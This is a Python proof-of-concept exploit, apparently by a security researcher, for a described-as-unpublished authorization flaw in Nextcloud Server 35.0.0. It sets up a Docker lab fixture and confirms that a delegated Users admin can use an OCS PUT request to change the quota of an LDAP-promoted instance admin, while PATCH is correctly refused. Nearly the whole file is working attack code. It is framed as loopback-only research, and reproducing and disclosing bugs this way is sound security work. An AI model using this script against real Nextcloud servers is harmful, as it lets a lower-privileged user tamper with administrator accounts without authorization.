#!/usr/bin/env python3
######################################################################################
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: nextcloud-ldap-put-isadmin (High)
#  Vendor: Nextcloud GmbH
#  Versions: Nextcloud Server 35.0.0
#  Impact: Delegated Users admin PUT-edits an LDAP-promoted instance admin
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Loopback only. Do not run against systems you do not own.
#
######################################################################################

"""Local oracle for unpublished Nextcloud PUT vs PATCH admin check.

Delegated Users admin (not instance admin) PUTs quota on an LDAP-promoted
admin who is isAdmin() but not in local group admin. PATCH correctly 403s.

Loopback only. No shells.
"""
from __future__ import annotations

import base64
import json
import os
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
BASE = os.environ.get("NC_URL", "http://127.0.0.1:18342").rstrip("/")
ADMIN = os.environ.get("NC_ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("NC_ADMIN_PASSWORD", "LabAdmin35!")
HELPDESK = os.environ.get("NC_HELPDESK_USER", "helpdesk")
HELPDESK_PASS = os.environ.get("NC_HELPDESK_PASSWORD", "LabHelpdesk35!")
TARGET = os.environ.get("NC_LDAP_UID", "ldapadmin")
WITNESS = "NEXTCLOUD-LDAP-PUT-ISADMIN-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "nextcloud-ldap-put-isadmin")
QUOTA_VALUE = "1 GB"
QUOTA_BYTES = 1073741824


def fail(msg: str) -> None:
    print(f"FAIL NEXTCLOUD-LDAP-PUT-ISADMIN {msg}", flush=True)
    raise SystemExit(1)


def basic(user: str, password: str) -> str:
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


def http(
    method: str,
    url: str,
    *,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 60.0,
) -> tuple[int, dict[str, str], bytes]:
    hdrs = {"User-Agent": "nextcloud-ldap-put-isadmin-lab"}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            return resp.status, {k.lower(): v for k, v in resp.headers.items()}, body
    except urllib.error.HTTPError as exc:
        return exc.code, {k.lower(): v for k, v in exc.headers.items()}, exc.read()
    except urllib.error.URLError as exc:
        fail(f"http {method} {url} error {exc}")


def ocs(
    method: str,
    path: str,
    user: str,
    password: str,
    *,
    json_payload: dict | None = None,
    form: dict[str, str] | None = None,
) -> tuple[int, dict, str]:
    hdrs = {
        "OCS-APIRequest": "true",
        "Accept": "application/json",
        "Authorization": basic(user, password),
    }
    body = None
    if json_payload is not None:
        hdrs["Content-Type"] = "application/json"
        body = json.dumps(json_payload).encode()
    elif form is not None:
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        body = urllib.parse.urlencode(form).encode()
    sep = "&" if "?" in path else "?"
    url = BASE + path + sep + "format=json"
    code, _, raw = http(method, url, data=body, headers=hdrs)
    text = raw.decode("utf-8", "replace")
    try:
        parsed = json.loads(text) if text else {}
    except json.JSONDecodeError:
        fail(f"ocs {method} {path} http={code} not json body={text[:400]!r}")
    return code, parsed, text


def ocs_data(parsed: dict) -> dict | list | None:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict):
        return ocs_wrap.get("data")
    return None


def ocs_meta(parsed: dict) -> dict:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict) and isinstance(ocs_wrap.get("meta"), dict):
        return ocs_wrap["meta"]
    return {}


def groups_from_user_data(data: object) -> list[str]:
    if not isinstance(data, dict):
        return []
    groups = data.get("groups") or []
    if isinstance(groups, dict):
        el = groups.get("element", list(groups.values()))
        groups = el
    if isinstance(groups, str):
        return [groups]
    if isinstance(groups, list):
        out: list[str] = []
        for item in groups:
            if isinstance(item, dict):
                gid = item.get("id") or item.get("gid")
                if gid is not None:
                    out.append(str(gid))
            else:
                out.append(str(item))
        return out
    return []


def quota_bytes(data: object) -> int | None:
    if not isinstance(data, dict):
        return None
    q = data.get("quota")
    if isinstance(q, dict):
        raw = q.get("quota")
        if isinstance(raw, (int, float)):
            return int(raw)
        if isinstance(raw, str) and raw.isdigit():
            return int(raw)
    if isinstance(q, (int, float)):
        return int(q)
    return None


def compose_exec(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", *args],
        cwd=HERE,
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )


def fixture_flags() -> dict:
    cp = subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "cp", str(HERE / "fixture.php"), "nextcloud:/tmp/nc-ldap-put-isadmin-fixture.php"],
        cwd=HERE,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    if cp.returncode != 0:
        fail(f"docker compose cp fixture.php rc={cp.returncode} {cp.stderr[:300]!r}")
    proc = compose_exec(
        "-u",
        "www-data",
        "-e",
        f"NC_LDAP_UID={TARGET}",
        "-e",
        f"NC_HELPDESK_USER={HELPDESK}",
        "-w",
        "/var/www/html",
        "nextcloud",
        "php",
        "/tmp/nc-ldap-put-isadmin-fixture.php",
    )
    text = (proc.stdout or "").strip()
    print(
        f"IOC php-fixture rc={proc.returncode} stdout={text[:800]!r} stderr={(proc.stderr or '')[:300]!r}",
        flush=True,
    )
    if not text:
        fail("php fixture empty")
    try:
        parsed = json.loads(text)
    except json.JSONDecodeError:
        fail(f"php fixture not json {text[:400]!r}")
    if not isinstance(parsed, dict) or parsed.get("error"):
        fail(f"php fixture {parsed}")
    return parsed


def main() -> None:
    print(
        f"IOC base={BASE} actor={HELPDESK} target={TARGET} witness={WITNESS}",
        flush=True,
    )

    flags = fixture_flags()
    print(
        f"IOC target-isAdmin={flags.get('target_isAdmin')!s} "
        f"target-isInGroupAdmin={flags.get('target_isInGroupAdmin')!s} "
        f"target-groups={flags.get('target_groups')!r}",
        flush=True,
    )
    print(
        f"IOC actor-isAdmin={flags.get('actor_isAdmin')!s} "
        f"actor-isDelegatedAdmin={flags.get('actor_isDelegatedAdmin')!s} "
        f"actor-isInGroupAdmin={flags.get('actor_isInGroupAdmin')!s} "
        f"actor-groups={flags.get('actor_groups')!r}",
        flush=True,
    )
    if flags.get("target_isAdmin") is not True:
        fail("target isAdmin not true (LDAP never promoted)")
    if flags.get("target_isInGroupAdmin") is not False:
        fail("target is in local admin group (wrong fixture)")
    if flags.get("actor_isDelegatedAdmin") is not True:
        fail("helpdesk isDelegatedAdmin not true")
    if flags.get("actor_isInGroupAdmin") is not False or flags.get("actor_isAdmin") is True:
        fail("helpdesk is instance admin (wrong fixture)")

    code, parsed, text = ocs("GET", f"/ocs/v2.php/cloud/users/{HELPDESK}", HELPDESK, HELPDESK_PASS)
    data = ocs_data(parsed)
    actor_groups = groups_from_user_data(data)
    print(
        f"IOC helpdesk-login http={code} meta={ocs_meta(parsed)} groups={actor_groups}",
        flush=True,
    )
    if code not in (200, 201):
        fail(f"helpdesk login/info http={code} body={text[:400]!r}")
    if "admin" in [str(g) for g in actor_groups]:
        fail("helpdesk is in admin group (wrong fixture)")

    code, parsed, text = ocs("GET", f"/ocs/v2.php/cloud/users/{TARGET}", HELPDESK, HELPDESK_PASS)
    data = ocs_data(parsed)
    target_groups = groups_from_user_data(data)
    before_quota = quota_bytes(data)
    print(
        f"IOC target-get http={code} groups={target_groups} quota={before_quota} "
        f"data={json.dumps(data)[:500] if isinstance(data, dict) else data!r}",
        flush=True,
    )
    if code not in (200, 201):
        fail(f"target get as helpdesk http={code} body={text[:400]!r}")
    if "admin" in [str(g) for g in target_groups]:
        fail("target is in local admin group (wrong fixture)")

    patch_code, patch_parsed, patch_text = ocs(
        "PATCH",
        f"/ocs/v2.php/cloud/users/{TARGET}",
        HELPDESK,
        HELPDESK_PASS,
        json_payload={"quota": QUOTA_VALUE},
    )
    patch_meta = ocs_meta(patch_parsed)
    print(
        f"IOC patch http={patch_code} meta={patch_meta} body={patch_text[:400]!r}",
        flush=True,
    )
    if patch_code == 200:
        fail("PATCH 200 (target not isAdmin / LDAP never promoted)")
    if patch_code != 403:
        fail(f"PATCH expected 403 got http={patch_code} meta={patch_meta}")

    put_code, put_parsed, put_text = ocs(
        "PUT",
        f"/ocs/v2.php/cloud/users/{TARGET}",
        HELPDESK,
        HELPDESK_PASS,
        form={"key": "quota", "value": QUOTA_VALUE},
    )
    put_meta = ocs_meta(put_parsed)
    print(
        f"IOC put http={put_code} meta={put_meta} body={put_text[:400]!r}",
        flush=True,
    )
    if put_code in (403, 404):
        fail(f"PUT {put_code} (gate also blocked; expected 200)")
    if put_code != 200:
        fail(f"PUT expected 200 got http={put_code} meta={put_meta}")

    code, parsed, text = ocs("GET", f"/ocs/v2.php/cloud/users/{TARGET}", ADMIN, ADMIN_PASS)
    data = ocs_data(parsed)
    after_quota = quota_bytes(data)
    quota_str = None
    if isinstance(data, dict):
        q = data.get("quota")
        if isinstance(q, dict):
            quota_str = str(q.get("quota"))
    print(
        f"IOC quota-after http={code} bytes={after_quota} raw={quota_str} "
        f"data={json.dumps(data)[:500] if isinstance(data, dict) else data!r}",
        flush=True,
    )
    if after_quota != QUOTA_BYTES and quota_str not in {str(QUOTA_BYTES), QUOTA_VALUE, "1 GB", "1GB"}:
        fail(f"quota not persisted after PUT bytes={after_quota} raw={quota_str}")

    print(
        f"SUCCESS NEXTCLOUD-LDAP-PUT-ISADMIN who=delegated-users-admin "
        f"target={TARGET} put={put_code} patch={patch_code} {WITNESS}",
        flush=True,
    )


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        fail(f"unhandled {type(exc).__name__}: {exc}")
